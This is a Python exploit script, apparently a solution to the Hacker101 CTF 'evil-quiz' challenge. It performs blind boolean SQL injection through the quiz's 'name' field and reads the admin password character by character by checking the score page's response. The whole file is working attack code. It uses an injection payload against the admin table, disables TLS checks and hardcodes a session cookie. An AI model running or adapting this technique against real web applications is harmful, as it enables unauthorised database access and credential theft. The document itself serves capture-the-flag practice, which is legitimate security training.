import requests
import sys
import urllib3
from urllib.parse import quote
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


headers = {"Content-Type":"application/x-www-form-urlencoded"}
session = requests.Session()
cookies = {"quizsession":"abc41229799d1c4ff52985ffb5d13d13"}



def post_payload(url, sqli_payload):
    data = 'name=%s' %sqli_payload
    session.post(url=url, headers=headers,  proxies=proxies, data=data, verify=False, cookies=cookies)




def flag(url):
    flag = ""
    for i in range (1,18):
        for j in range(36,126):
            char = chr(j)
            payload = "' or ascii(SUBSTRING((SELECT password FROM admin WHERE username='admin' limit 1),%s,1))=%s;-- -"%(i,j)
            #encoded_payload = quote(payload)
            post_payload(url, payload)
            
            res = session.get(url=url+'score/', proxies=proxies, verify=False, cookies=cookies)
            
            if "There is 0 other player(s) with " not in res.text:
                flag += char
                sys.stdout.write('\r' + flag)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + flag + char)
                sys.stdout.flush()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: %s url" %sys.argv[0])
        print("[+] Example: %s https://18b30cb46e76ced1b5dd40655dc61c8f.ctf.hacker101.com/evil-quiz/" %sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("Extracting the flag....")
    flag(url)
